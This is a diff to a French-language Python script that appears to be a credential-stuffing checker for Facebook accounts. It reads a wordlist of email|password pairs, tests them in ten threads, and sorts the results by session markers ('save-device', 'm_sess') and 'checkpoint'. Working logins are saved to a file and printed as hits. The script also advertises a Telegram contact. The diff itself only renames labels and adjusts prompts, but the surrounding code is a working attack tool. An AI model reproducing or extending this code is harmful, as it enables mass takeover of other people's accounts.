@@ -35,7 +35,7 @@ def fissure(email):
 	if "save-device" in r or "m_sess" in r:
 		ajouter.append(email)
 		open(sauvegarder,"a+").write("%s|%s\n"%(email,pole_nord[compteur-1]))
-		print("[ \033[1;32mLIVE-%s\033[0m ] %s -> %s"%(len(ajouter),email,pole_nord[compteur-1]))
+		print("[ \033[1;32mReussie-%s\033[0m ] %s -> %s"%(len(ajouter),email,pole_nord[compteur-1]))
 		
 	if "checkpoint" in r:
 		retirer.append(email)
@@ -49,15 +49,15 @@ features="html.parser")
 for x in beau("input"):
 	if "login" in x["name"]:
 		sous = x["value"]
-print("*: separateur -> em|ps")
+#print("*: separateur -> em|ps")
 try:
 	print("*: https://t.me/Faxelh\n")
         sauvegarder = raw_input(" Notifier ou stocker le resusltat : ")
-	ouverture = open(raw_input("?: Notifier l'emplacement de votre wordlist: ")).read().splitlines()
+	ouverture = open(raw_input("Notifier l'emplacement de votre wordlist: ")).read().splitlines()
 except Exception as f:
 	exit("!: %s"%(f))
 for x in ouverture:
-	k=x.split("|")
+	k = x.split("|")
 	pole_nord.append(k[1])
 	pole_sud.append(k[0])
 program=ThreadPool(10)
